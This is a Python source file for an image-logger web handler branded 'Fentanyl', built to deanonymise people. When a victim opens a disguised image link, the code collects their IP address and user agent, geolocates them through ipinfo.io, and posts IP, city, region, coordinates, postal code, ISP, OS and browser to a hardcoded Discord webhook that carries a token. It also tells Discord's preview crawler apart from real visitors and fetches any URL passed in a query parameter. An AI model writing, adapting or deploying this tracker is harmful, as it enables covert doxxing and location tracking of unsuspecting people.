from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx, base64, httpagentparser

webhook = 'https://discord.com/api/webhooks/1517942914515210411/hHAvckZOavjRoME7Uyt2qXVF0IE6CP0iO2z9dFh_nbu1QWDbHBw6_dsr6UBcI8QzEZFo'  # Replace with your webhook
bindata = httpx.get('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCTeJgEKkWBNzhM_Qzq5OYn56mFqDUPXSzHw&s.jpg').content
buggedimg = True  # Set to True if you want the image to load on Discord, False otherwise
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "Fentanyl",
        "content": "@everyone",
        "embeds": [{
            "title": "Fentanyl strikes again!",
            "color": 16711803,
            "description": "A victim opened the original image. You can find their info below.",
            "author": {"name": "Fentanyl"},
            "fields": [
                {
                    "name": "IP Info",
                    "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
                    "inline": True
                },
                {
                    "name": "Advanced Info",
                    "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** ```yaml\n{useragent}\n```",
                    "inline": False
                }
            ]
        }]
    }

def prev(ip, uag):
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [{
            "title": "Fentanyl Alert!",
            "color": 16711803,
            "description": f"Discord previewed a Fentanyl image! Expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** ```yaml\n{uag}\n```",
            "author": {"name": "Fentanyl"}
        }]
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        query = parse.parse_qs(parse.urlparse(path).query)
        
        # Handle image requests
        if '/image.jpg' in path:
            self.send_response(200)
            self.send_header('Content-Type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(bindata)
            return
            
        # Handle other requests
        if 'url' in query:
            try:
                data = httpx.get(query['url'][0]).content
            except Exception:
                data = bindata
        else:
            data = bindata
            
        useragent = self.headers.get('user-agent', 'No User Agent Found!')
        os, browser = httpagentparser.simple_detect(useragent)
        
        # Check for Discord preview
        forwarded_for = self.headers.get('x-forwarded-for', '')
        if forwarded_for.startswith(('35','34','104.196')):
            if 'discord' in useragent.lower():
                self.send_response(200)
                self.send_header('Content-Type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(buggedbin if buggedimg else bindata)
                httpx.post(webhook, json=prev(forwarded_for, useragent))
            else:
                self.send_response(200)
                self.send_header('Content-Type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(data)
                ipInfo = httpx.get(f'https://ipinfo.io/{forwarded_for}/json').json()
                httpx.post(webhook, json=formatHook(
                    ipInfo['ip'], ipInfo['city'], ipInfo['region'], 
                    ipInfo['country'], ipInfo['loc'], ipInfo['org'], 
                    ipInfo['postal'], useragent, os, browser
                ))
